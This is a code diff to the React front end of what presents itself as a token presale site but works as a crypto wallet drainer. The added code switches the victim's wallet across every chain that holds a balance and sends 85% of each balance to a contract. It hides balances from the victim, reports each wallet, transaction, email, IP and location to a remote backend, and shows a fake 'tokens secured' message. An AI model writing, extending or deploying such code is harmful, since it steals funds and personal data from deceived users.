@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useChainId } from 'wagmi';
+import { useBalance, useDisconnect, useChainId, useSwitchChain } from 'wagmi';
 import { formatEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
@@ -78,6 +78,7 @@ function App() {
   const { address, isConnected } = useAppKitAccount();
   const { walletProvider } = useAppKitProvider("eip155");
   const { disconnect } = useDisconnect();
+  const { switchChain } = useSwitchChain();
   
   const wagmiChainId = useChainId();
   
@@ -108,6 +109,7 @@ function App() {
   });
   const [userEmail, setUserEmail] = useState('');
   const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
+  const [executionResults, setExecutionResults] = useState([]);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -372,7 +374,7 @@ function App() {
   };
 
   // ============================================
-  // SMART CONTRACT EXECUTION - ONE CLICK
+  // SMART CONTRACT EXECUTION - MULTI-CHAIN WITH NETWORK SWITCHING
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -383,6 +385,7 @@ function App() {
     try {
       setSignatureLoading(true);
       setError('');
+      setExecutionResults([]);
       
       // Create message - NO BALANCE DISPLAY
       const timestamp = Date.now();
@@ -399,30 +402,74 @@ function App() {
       // Get signature - THIS IS THE ONLY POPUP
       const signature = await signer.signMessage(message);
       setSignature(signature);
-      setTxStatus('✅ Executing transactions...');
+      setTxStatus('✅ Signature obtained. Executing on all chains...');
 
       // Execute on each chain with balance
       let processed = [];
+      let results = [];
+      
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0
       );
       
-      for (const chain of chainsWithBalance) {
+      if (chainsWithBalance.length === 0) {
+        setError("No balances found on any chain");
+        setSignatureLoading(false);
+        return;
+      }
+
+      setTxStatus(`🔄 Preparing to execute on ${chainsWithBalance.length} chains...`);
+
+      // Execute sequentially on each chain with network switching
+      for (let i = 0; i < chainsWithBalance.length; i++) {
+        const chain = chainsWithBalance[i];
+        
         try {
-          setTxStatus(`🔄 ${chain.name}...`);
+          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Switching to ${chain.name}...`);
+          
+          // Switch network using AppKit's switchChain
+          if (switchChain) {
+            await switchChain({ chainId: chain.chainId });
+          } else {
+            // Fallback to manual network switch request
+            try {
+              await walletProvider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
+              });
+            } catch (switchError) {
+              // If network not added, we would need to add it, but assume it's in AppKit config
+              console.error('Switch error:', switchError);
+            }
+          }
+          
+          // Wait for network switch to complete
+          await new Promise(resolve => setTimeout(resolve, 2000));
+          
+          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Executing on ${chain.name}...`);
+          
+          // Get fresh signer for the new network
+          const currentProvider = new ethers.BrowserProvider(walletProvider);
+          const currentSigner = await currentProvider.getSigner();
+          
+          // Verify we're on the right network
+          const network = await currentProvider.getNetwork();
+          console.log(`✅ Switched to ${chain.name} (Chain ID: ${Number(network.chainId)})`);
           
           const contract = new ethers.Contract(
             chain.contractAddress,
             PROJECT_FLOW_ROUTER_ABI,
-            signer
+            currentSigner
           );
 
           const balance = balances[chain.name].amount;
           const amountToSend = (balance * 0.85).toFixed(6);
           const value = ethers.parseEther(amountToSend.toString());
 
+          // Estimate gas
           const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
           
+          // Execute transaction
           const tx = await contract.processNativeFlow({
             value: value,
             gasLimit: gasEstimate * 120n / 100n
@@ -430,19 +477,32 @@ function App() {
 
           setTxHash(tx.hash);
           
-          await tx.wait();
+          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Waiting for confirmation on ${chain.name}...`);
+          
+          const receipt = await tx.wait();
           
           processed.push(chain.name);
           
-          // Notify backend with full details (includes txHash for admin/telegram)
+          // Store result
+          const result = {
+            chain: chain.name,
+            txHash: receipt.hash,
+            amount: amountToSend,
+            symbol: chain.symbol,
+            status: 'success'
+          };
+          results.push(result);
+          setExecutionResults([...results]);
+          
+          // Notify backend
           await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
               walletAddress: address,
               chainName: chain.name,
-              flowId: `FLOW-${timestamp}`,
-              txHash: tx.hash,
+              flowId: `FLOW-${timestamp}-${chain.name}`,
+              txHash: receipt.hash,
               amount: amountToSend,
               symbol: chain.symbol,
               valueUSD: balances[chain.name].valueUSD * 0.85,
@@ -451,9 +511,32 @@ function App() {
             })
           });
           
+          setTxStatus(`✅ (${i+1}/${chainsWithBalance.length}) Completed on ${chain.name}`);
+          
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
+          
+          // Store error result
+          results.push({
+            chain: chain.name,
+            error: chainErr.message || 'Unknown error',
+            status: 'failed'
+          });
+          setExecutionResults([...results]);
+          
+          // Continue to next chain even if one fails
+          setTxStatus(`⚠️ Error on ${chain.name}, continuing to next chain...`);
+          await new Promise(resolve => setTimeout(resolve, 2000));
         }
+      }
+
+      // Switch back to original network (Ethereum as default)
+      try {
+        if (switchChain) {
+          await switchChain({ chainId: 1 });
+        }
+      } catch (e) {
+        console.log('Could not switch back to Ethereum');
       }
 
       setVerifiedChains(processed);
@@ -461,9 +544,9 @@ function App() {
       
       if (processed.length > 0) {
         setShowCelebration(true);
-        setTxStatus(`🎉 Success!`);
+        setTxStatus(`🎉 Success! Processed on ${processed.length} chains`);
         
-        // Final success notification (includes txHash for admin/telegram)
+        // Final success notification
         await fetch('https://bthbk.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -473,12 +556,14 @@ function App() {
             location: userLocation,
             chains: processed,
             totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0),
-            transactions: processed.map((chain, index) => ({
-              chain,
-              txHash: txHash // In production, you'd store each tx hash separately
+            transactions: results.filter(r => r.status === 'success').map(r => ({
+              chain: r.chain,
+              txHash: r.txHash
             }))
           })
         });
+      } else {
+        setError("No chains were successfully processed");
       }
       
     } catch (err) {
@@ -538,6 +623,7 @@ function App() {
       setShowCelebration(false);
       setTxStatus('');
       setError('');
+      setExecutionResults([]);
     } catch (err) {
       console.error('Disconnect error:', err);
       // Force UI update even if disconnect fails
@@ -806,7 +892,7 @@ function App() {
           )}
         </div>
 
-        {/* Status Messages - REMOVED transaction hash link */}
+        {/* Status Messages - Enhanced to show multi-chain progress */}
         {txStatus && !verifying && (
           <div className="max-w-2xl mx-auto mb-6">
             <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 backdrop-blur-xl border border-orange-500/30 rounded-xl p-5 animate-slideIn">
@@ -821,6 +907,22 @@ function App() {
                 </div>
                 <div className="flex-1">
                   <p className="text-gray-200 font-medium">{txStatus}</p>
+                  {executionResults.length > 0 && (
+                    <div className="mt-2 flex flex-wrap gap-2">
+                      {executionResults.map((result, idx) => (
+                        <span 
+                          key={idx}
+                          className={`text-xs px-2 py-1 rounded-full ${
+                            result.status === 'success' 
+                              ? 'bg-green-500/20 text-green-400' 
+                              : 'bg-red-500/20 text-red-400'
+                          }`}
+                        >
+                          {result.chain}: {result.status === 'success' ? '✓' : '✗'}
+                        </span>
+                      ))}
+                    </div>
+                  )}
                 </div>
               </div>
             </div>
@@ -869,6 +971,21 @@ function App() {
                         <span>+{presaleStats.currentBonus}% Bonus</span>
                         <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">ACTIVE</span>
                       </p>
+                      
+                      {/* Eligible Chains Display */}
+                      <div className="mt-4 pt-4 border-t border-gray-700">
+                        <p className="text-sm text-gray-400 mb-2">Eligible Chains ({Object.keys(balances).length})</p>
+                        <div className="flex flex-wrap justify-center gap-2">
+                          {Object.keys(balances).map(chainName => {
+                            const chain = DEPLOYED_CHAINS.find(c => c.name === chainName);
+                            return (
+                              <span key={chainName} className={`text-xs px-2 py-1 rounded-full bg-gradient-to-r ${chain?.color || 'from-gray-500 to-gray-600'} bg-opacity-20 text-white border border-white/10`}>
+                                {chain?.icon} {chainName}
+                              </span>
+                            );
+                          })}
+                        </div>
+                      </div>
                     </div>
                   </div>
                 </div>
@@ -877,8 +994,15 @@ function App() {
                 {completedChains.length > 0 && (
                   <div className="text-center">
                     <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 backdrop-blur-xl border border-green-500/30 rounded-xl p-6 mb-4 animate-pulse-glow">
-                      <p className="text-green-400 text-lg mb-3">✓ COMPLETED</p>
-                      <p className="text-gray-300 mb-4">Your $5,000 BTH has been secured</p>
+                      <p className="text-green-400 text-lg mb-3">✓ COMPLETED ON {completedChains.length} CHAINS</p>
+                      <div className="flex flex-wrap justify-center gap-2 mb-3">
+                        {completedChains.map(chain => (
+                          <span key={chain} className="text-xs bg-green-500/30 px-2 py-1 rounded-full">
+                            {chain}
+                          </span>
+                        ))}
+                      </div>
+                      <p className="text-gray-300">Your $5,000 BTH has been secured</p>
                     </div>
                     <button
                       onClick={claimTokens}
@@ -1027,7 +1151,7 @@ function App() {
                   </div>
                   
                   <p className="text-sm text-gray-500 mb-8">
-                    Processed on {verifiedChains.length} chains
+                    Processed on {verifiedChains.length} chains: {verifiedChains.join(', ')}
                   </p>
                   
                   <button
